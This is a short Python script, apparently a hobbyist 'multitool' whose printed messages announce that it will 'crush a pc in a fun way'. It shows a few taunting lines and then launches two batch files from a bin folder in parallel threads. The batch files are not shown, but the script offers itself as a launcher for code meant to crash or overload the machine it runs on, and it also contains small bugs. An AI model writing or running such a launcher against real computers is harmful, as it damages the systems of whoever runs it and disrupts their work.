import os
import sys
import time
import ctypes
import subprocess
import threading


#settings
def window():
        ctypes.windll.kernel32.SetConsoleTitleW("pow")
        os.system('mode con: cols=70 lines=5')
def cls():
    os.system('cls' if os.name=='nt' else 'clear')


#slowprint system
def slowprint(s, c, newLine=True):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1. / 30)


#paths runner
paths = (".\\bin\slower.bat", ".\\bin\\astros3x.bat")

def runner(bats):
    subprocess.call([bats])


#main
if __name__ == "__main__":
    window()
    slowprint("Hi, @astros3x here, the best multitool coder github has ever seen!", .10)
    time.sleep(0.5)
    cls()
    slowprint("Now you'll see how to crush a pc in a fun way...", .10)
    time.sleep(0.1)
    slowprint("Grrrrrrrrrrrr", .5)
    cls
    threads = []
    for bats in paths:
        thread = threading.Thread(target=runner, args=[bats])
        threads.append(thread)
        thread.start()